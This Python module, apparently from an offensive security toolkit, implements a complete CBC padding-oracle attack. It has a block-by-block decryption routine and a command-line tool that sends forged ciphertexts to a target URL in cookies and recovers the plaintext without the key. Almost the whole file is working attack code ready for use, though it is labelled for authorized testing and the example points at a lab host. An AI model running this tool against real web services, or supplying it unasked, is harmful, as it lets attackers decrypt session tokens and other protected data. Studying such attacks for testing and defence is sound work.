#!/usr/bin/env python3
"""
redshift_toolkit.utils.padding_oracle — generic CBC padding-oracle attack.

What is a padding oracle?
-------------------------
A web (or other) endpoint that:
  1. Accepts a ciphertext (in a cookie, parameter, header).
  2. Decrypts it as AES-CBC (or any CBC cipher) with PKCS#7 padding.
  3. Behaves *differently* depending on whether the resulting padding is
     valid — different status code, different error message, different
     timing.

That distinguishable behavior is the oracle. With it, we can decrypt the
ciphertext one byte at a time without ever knowing the key.

This module provides:
  - `decrypt(ciphertext, oracle)` : decrypt a full CBC ciphertext.
  - A CLI for use against an HTTP-cookie-based oracle out of the box.
  - An importable API so you can wrap any custom oracle with one Python
    function returning True/False.

The math
--------
For a 2-block ciphertext IV || C1 :
  P1 = D(C1) XOR IV
We modify IV byte-by-byte to land on a valid padding (0x01) at the last
byte. Each successful guess reveals one byte of D(C1), then we XOR with
the original IV to recover P1.

Reference: Rizzo & Duong (2010), POODLE (CVE-2014-3566), ASP.NET (CVE-2010-3332).

CLI usage
---------
  python3 -m redshift_toolkit.utils.padding_oracle \
      --url 'http://lab.local/decrypt' \
      --cookie 'session={CT}' \
      --pad-good-marker 'invalid-mac' \
      --ciphertext 0x...

API usage
---------
  from redshift_toolkit.utils.padding_oracle import decrypt

  def my_oracle(ct: bytes) -> bool:
      r = requests.get(URL, cookies={"session": base64url(ct)})
      # Returns True if padding was valid (auth failed != padding error)
      return "invalid-mac" in r.text

  plaintext = decrypt(ciphertext_bytes, my_oracle, block_size=16)

Author: Redshift Project — Module 07
License: MIT — Authorized testing only.
"""

from __future__ import annotations

import argparse
import base64
import sys
import time
from typing import Callable, Iterable

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
GREY = "\033[90m"
BOLD = "\033[1m"
RESET = "\033[0m"

OracleFn = Callable[[bytes], bool]


def _blocks(data: bytes, n: int) -> list[bytes]:
    return [data[i:i + n] for i in range(0, len(data), n)]


def _xor(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))


def decrypt_block(prev: bytes, target: bytes, oracle: OracleFn,
                  block_size: int = 16, on_progress=None) -> bytes:
    """Decrypt a single CBC ciphertext block, returning its plaintext.

    `prev`   — the preceding block (acts as IV for `target`).
    `target` — the block we want to decrypt.
    `oracle` — function(crafted_two_blocks) → True iff padding is valid.
    """
    intermediate = bytearray(block_size)   # D(target) — to be recovered
    forged = bytearray(block_size)         # what we send as the "IV"

    for byte_idx in range(block_size - 1, -1, -1):
        pad_value = block_size - byte_idx
        # Lock in already-recovered bytes so they decrypt to pad_value
        for j in range(byte_idx + 1, block_size):
            forged[j] = intermediate[j] ^ pad_value

        found = False
        for guess in range(256):
            forged[byte_idx] = guess
            if oracle(bytes(forged) + target):
                # Edge case: when byte_idx == last, we may collide on \x02\x02
                # instead of the desired \x01. Disambiguate by tampering with
                # the prior byte and re-querying.
                if byte_idx == block_size - 1:
                    probe = bytearray(forged)
                    probe[byte_idx - 1] ^= 0x01
                    if not oracle(bytes(probe) + target):
                        continue
                intermediate[byte_idx] = guess ^ pad_value
                found = True
                if on_progress:
                    on_progress(byte_idx, guess, intermediate[byte_idx])
                break
        if not found:
            raise RuntimeError(
                f"oracle gave no valid padding for byte index {byte_idx} — "
                "is the oracle function correct?"
            )

    return _xor(prev, bytes(intermediate))


def decrypt(ciphertext: bytes, oracle: OracleFn, block_size: int = 16,
            verbose: bool = False) -> bytes:
    """Decrypt a CBC ciphertext (IV || C1 || C2 || ... || Cn) using `oracle`."""
    if len(ciphertext) % block_size != 0:
        raise ValueError("ciphertext length must be a multiple of block size")
    if len(ciphertext) < 2 * block_size:
        raise ValueError("need at least IV + 1 block")

    blocks = _blocks(ciphertext, block_size)
    plaintext = b""
    for i in range(1, len(blocks)):
        if verbose:
            print(f"[*] decrypting block {i}/{len(blocks) - 1} ...",
                  file=sys.stderr)
        prev, target = blocks[i - 1], blocks[i]
        pt = decrypt_block(prev, target, oracle, block_size)
        plaintext += pt
        if verbose:
            print(f"    block {i} plaintext bytes: {pt!r}", file=sys.stderr)

    # Strip PKCS#7 padding from the final block
    pad = plaintext[-1]
    if 1 <= pad <= block_size and plaintext[-pad:] == bytes([pad]) * pad:
        plaintext = plaintext[:-pad]
    return plaintext


# ─── CLI: HTTP cookie oracle ────────────────────────────────────────────────
def _http_oracle(url: str, cookie_template: str, marker: str,
                 timeout: float, encoding: str = "b64url"):
    """Build an oracle that swaps {CT} in the cookie value, fetches, and
    treats `marker` substring in the response as 'padding was valid'."""
    try:
        import requests  # type: ignore
    except ImportError:
        print("CLI HTTP oracle needs `requests`: pip install requests", file=sys.stderr)
        sys.exit(2)

    def encode(b: bytes) -> str:
        if encoding == "b64url":
            return base64.urlsafe_b64encode(b).decode().rstrip("=")
        if encoding == "b64":
            return base64.b64encode(b).decode()
        if encoding == "hex":
            return b.hex()
        raise ValueError(encoding)

    def call(ct: bytes) -> bool:
        cookies_str = cookie_template.replace("{CT}", encode(ct))
        # Parse "name1=val1; name2=val2"
        cookies = {}
        for pair in cookies_str.split(";"):
            if "=" in pair:
                k, v = pair.strip().split("=", 1)
                cookies[k] = v
        r = requests.get(url, cookies=cookies, timeout=timeout)
        return marker in r.text

    return call


def main() -> int:
    ap = argparse.ArgumentParser(description="CBC padding-oracle attacker.")
    ap.add_argument("--ciphertext", required=True,
                    help="ciphertext as 0xHEX, hex, or base64")
    ap.add_argument("--block-size", type=int, default=16)
    ap.add_argument("--url", help="HTTP endpoint that decrypts and reports")
    ap.add_argument("--cookie", default="session={CT}",
                    help="cookie template; '{CT}' is replaced with encoded ciphertext")
    ap.add_argument("--pad-good-marker", default="",
                    help="substring in HTTP response that means padding was VALID")
    ap.add_argument("--encoding", choices=["b64url", "b64", "hex"], default="b64url")
    ap.add_argument("--timeout", type=float, default=5.0)
    ap.add_argument("--verbose", action="store_true")
    args = ap.parse_args()

    raw = args.ciphertext
    if raw.startswith("0x") or raw.startswith("0X"):
        ct = bytes.fromhex(raw[2:])
    else:
        try:
            ct = bytes.fromhex(raw)
        except ValueError:
            ct = base64.b64decode(raw + "=" * (-len(raw) % 4))

    if not args.url:
        print("This CLI requires --url to test against a real oracle. "
              "For unit testing, import `decrypt` and pass your own oracle fn.",
              file=sys.stderr)
        return 2

    oracle = _http_oracle(args.url, args.cookie, args.pad_good_marker,
                          args.timeout, args.encoding)

    color = sys.stdout.isatty()
    print(f"{BOLD if color else ''}[*] starting padding oracle attack against {args.url}{RESET if color else ''}")
    t0 = time.time()
    try:
        pt = decrypt(ct, oracle, args.block_size, verbose=args.verbose)
    except Exception as e:
        print(f"{RED if color else ''}[!] attack failed: {e}{RESET if color else ''}",
              file=sys.stderr)
        return 1
    dt = time.time() - t0
    print(f"{GREEN if color else ''}[+] decrypted in {dt:.1f}s — {len(pt)} byte(s){RESET if color else ''}")
    print(f"plaintext (latin-1): {pt.decode('latin-1', errors='replace')!r}")
    print(f"plaintext (hex):     {pt.hex()}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
